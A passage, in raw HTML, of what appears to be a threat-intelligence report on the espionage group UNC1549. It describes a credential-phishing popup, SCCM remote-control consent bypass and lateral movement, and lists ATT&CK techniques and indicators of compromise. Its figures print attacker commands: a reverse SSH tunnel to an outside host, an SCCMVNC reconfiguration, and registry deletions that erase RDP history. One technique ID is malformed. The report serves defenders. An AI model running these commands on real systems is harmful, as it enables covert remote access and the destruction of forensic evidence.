baseline;\">Figure 6: Examples of screenshot files created by </span><span style=\"vertical-align: baseline;\">SIGHTGRAB</span><span style=\"vertical-align: baseline;\"> on disk</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Mandiant observed UNC1549 strategically deploy SIGHTGRAB on workstations to target users in two categories: those handling sensitive data, allowing for subsequent data exposure and exfiltration, and those with privileged access, enabling privilege escalation and access to restricted systems.</span></p>\n<h4><span style=\"vertical-align: baseline;\">TRUSTTRAP</span></h4>\n<p><span style=\"vertical-align: baseline;\">A malware that serves a Windows prompt to trick the user into submitting their credentials. The captured credentials are saved in cleartext to a file. Figure 7 shows a sample popup by TRUSTTRAP mimicking the Microsoft Outlook login window.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--medium\n      \n      \n        h-c-grid__col\n        \n        h-c-grid__col--4 h-c-grid__col--offset-4\n        \n      \">\n\n      \n      \n        \n        <img alt=\"Screenshot showing the fake Microsoft Outlook login window\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc1549-ttps-fig7.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: Screenshot showing the fake Microsoft Outlook login window</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">TRUSTTRAP has been used by UNC1549 since at least 2023 for obtaining user credentials used for lateral movement.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Reconnaissance and Lateral Movement</span></h3>\n<p><span style=\"vertical-align: baseline;\">For internal reconnaissance, UNC1549 leveraged legitimate tools and publicly available utilities, likely to blend in with standard administrative activities. </span><a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AD Explorer</span></a><span style=\"vertical-align: baseline;\">, a valid executable signed by Microsoft, was used to query Active Directory and inspect its configuration details. Alongside this, the group employed native Windows commands like </span><code style=\"vertical-align: baseline;\">net user</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">net group</code><span style=\"vertical-align: baseline;\"> to enumerate specific user accounts and group memberships within the domain, and PowerShell scripts for ping and port scanning reconnaissance on specific subnets, typically those associated with privileged servers or IT administrator workstations </span></p>\n<p><span style=\"vertical-align: baseline;\">UNC1549 uses a wide variety of methods for lateral movement, depending on restrictions within the victim environment. Most frequently, RDP was used. Mandiant also observed the use of PowerShell Remoting, Atelier Web Remote Commander (“AWRC”), and SCCM remote control, including execution of variants of SCCMVNC to enable SCCM remote control on systems.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Atelier Web Remote Commander</span></h4>\n<p><span style=\"vertical-align: baseline;\">Atelier Web Remote Commander (AWRC) is a commercial utility for remotely managing, auditing, and supporting Windows systems. Its key distinction is its agentless design, meaning it requires no software installation or pre-configuration on the remote machine, enabling administrators to connect immediately. </span></p>\n<p><span style=\"vertical-align: baseline;\">Leveraging the capabilities of AWRC, UNC1549 utilized this publicly available commercial tool to facilitate post-compromise activities. These activities included:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Established remote connections: Used AWRC to connect remotely to targeted hosts within the compromised network</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Conducted reconnaissance: Employed AWRC's built-in functions to gather information by:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Enumerating running services</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Enumerating active processes</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Enumerating existing RDP sessions</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Stole credentials: Exploited AWRC to exfiltrate sensitive browser files known to contain stored user credentials from remote systems</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Deployed malware: Used AWRC as a vector to transfer and deploy malware onto compromised machines</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">SCCMVNC</span></h4>\n<p><a href=\"https://github.com/netero1010/SCCMVNC\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">SCCMVNC</span></a><span style=\"vertical-align: baseline;\"> is a tool designed to leverage the existing Remote Control feature within Microsoft System Center Configuration Manager (SCCM/ConfigMgr) to achieve a VNC-like remote access experience without requiring additional third-party modules or user consent/notifications.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>SCCM.exe reconfig /target:[REDACTED]</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 8: Example of an UNC1549 executing SCCMVNC command</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The core functionality of SCCMVNC lies in its ability to manipulate the existing Remote Control feature of SCCM. Instead of deploying a separate VNC server or other remote access software, the tool directly interacts with and reconfigures the settings of the native SCCM Remote Control service on a client workstation. This approach leverages an already present and trusted component within the enterprise environment.</span></p>\n<p><span style=\"vertical-align: baseline;\">A key aspect of SCCMVNC is its capacity to bypass the standard consent and notification mechanisms typically associated with SCCM Remote Control. Normally, when an SCCM remote control session is initiated, the end-user is prompted for permission, and various notification icons or connection bars are displayed. SCCMVNC effectively reconfigures the underlying SCCM settings (primarily through WMI interactions) to disable these user-facing requirements. This alteration allows for a significantly more discreet and seamless remote access experience, akin to what one might expect from a VNC connection where the user might not be immediately aware of the ongoing session.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Command and Control</span></h3>\n<p><span style=\"vertical-align: baseline;\">UNC1549 continued to use Microsoft Azure Web Apps registrations and cloud infrastructure for C2. In addition to backdoors including MINIBUS, MINIBIKE, and TWOSTROKE, UNC1549 relied heavily on SSH reverse tunnels established on compromised systems to forward traffic from their C2 servers to compromised systems. This technique limited the availability of host-based artifacts during investigations, since security telemetry would only record network connections. For example, during data collection from SMB shares, outbound connections were observed from the SSH processes to port 445 on remote systems, but the actual data collected could not be confirmed due to no staging taking place within the victim environment, and object auditing being disabled.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>C:\\windows\\system32\\openssh\\ssh.exe[Username]@[IP Address] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 9: Example of an UNC1549 reverse SSH comman</span><span style=\"vertical-align: baseline;\">d</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Mandiant also identified evidence of UNC1549 deploying a variety of redundant remote access methods, including ZEROTIER and NGROK. In some instances, these alternative methods weren't used by the threat actor until victim organizations had performed remediation actions, suggesting they are primarily deployed to retain access.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Complete Mission</span></h3>\n<h4><span style=\"vertical-align: baseline;\">Espionage</span></h4>\n<p><span style=\"vertical-align: baseline;\">UNC1549's operations appear strongly motivated by espionage, with mission objectives centering around extensive data collection from targeted networks. The group actively seeks sensitive information, including network/IT documentation, intellectual property, and emails. Furthermore, UNC1549 often leverages compromised organizations as a pivot point, using their access to target other entities, particularly those within the same industry sector, effectively conducting third-party supplier and partner intrusions to further their intelligence-gathering goals.</span></p>\n<p><span style=\"vertical-align: baseline;\">Notably, Mandiant responded to one intrusion at an organization in an unrelated sector, and assessed that the intrusion was opportunistic due to the initial spear phishing lure being related to a job at an aerospace and defense organization. This demonstrated UNC1549’s ability to commit resources to expanding access and persistence in victim organizations that don’t immediately meet traditional espionage goals.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Defense Evasion</span></h3>\n<p><span style=\"vertical-align: baseline;\">UNC1549 frequently deleted utilities from compromised systems after execution to avoid detection and hinder investigation efforts. The deletion of forensic artifacts, including RDP connection history registry keys, was also observed. Additionally, as described earlier, the group repeatedly used SSH reverse tunnels from victim hosts back to their infrastructure, a technique which helped hide their activity from EDR agents installed on those systems. Combined, this activity demonstrated an increase in the operational security of UNC1549 over the past year.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\n\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 10: Examples of UNC1549 commands to delete RDP connection history registry keys</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Acknowledgement</span></h3>\n<p><span style=\"vertical-align: baseline;\">This analysis would not have been possible without the assistance from across Google Threat Intelligence Group, Mandiant Consulting and FLARE. We would like to specifically thank Greg Sinclair and Mustafa Nasser from FLARE, and Melissa Derr, Liam Smith, Chris Eastwood, Alex Pietz, Ross Inman, and Emeka Agu from Mandiant Consulting.</span></p>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">MITRE ATT&amp;CK</span></span></h3></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">TACTIC</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">ID</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Name</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Collection</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1213.002</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Data from Information Repositories: SharePoint</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 browsed Microsoft Teams and SharePoint to download files used for extortion.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Collection</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1113</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Screen Capture</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 was observed making screenshots from sensitive data.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Reconnaissance</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T16561598.003</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Phishing for Information</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 used third party vendor accounts to obtain privileged accounts using a Password Reset portal theme.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Credential Access</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1110.003</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Brute Force: Password Spraying</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 was observed performing password spray attacks against the Domain.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Credential Access</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1003.006</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">OS Credential Dumping: DCSync</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 was observed using DCSYNCER.SLICK to perform DCSync on domain controller level.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Defense Evasion</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1574.001</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Hijack Execution Flow: DLL Search Order Hijacking</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 was observed using Search Order Hijacking to execute both LIGHTRAIL and DCSYNCER.SLICK.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Initial Access</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1078</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Valid Accounts</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 used valid compromised accounts to gain initial access</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Initial Access</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1199</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Trusted Relationship</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 used trusted third party vendor accounts for both initial access and lateral movement.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Indicators of Compromise (IOCs)</span></h3>\n<p><span style=\"vertical-align: baseline;\">The <a href=\"https://www.virustotal.com/gui/collection/395ae8a72896c38d2280dd4f838341d68b0bcd7a5da89752e3c2e53ccf0da235\" rel=\"noopener\" target=\"_blank\">following IOCs are available in a GTI Collection</a> for registered users.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<thead>\n<tr>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Type</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Indicator</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">104.194.215[.]88</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">13.60.50[.]172</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">167.172.137[.]208</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">34.18.42[.]26</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">4.188.75[.]206</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">4.240.113[.]27</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">40.119.176[.]233</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">46.31.115[.]92</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">politicalanorak[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ac-connection-status105.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">GHOSTLINE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">acc-cloud-connection.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">GHOSTLINE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-az-check-status45.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-az-check-status675.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-az-status45.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-az-status795.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-internal-log65.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-internal-logs.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">active-intranet-logs.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airbus.usa-careers[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Phishing domain for initial access</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airlinecontrolsite.uaenorth.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DEEPROOT</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airlinecontrolsite.westus3.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DEEPROOT</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airplaneserviceticketings[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airseatregister.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DEEPROOT</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airseatsregister.qatarcentral.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DEEPROOT</span></p>\n</td>\n</tr>\n<tr>\n<td 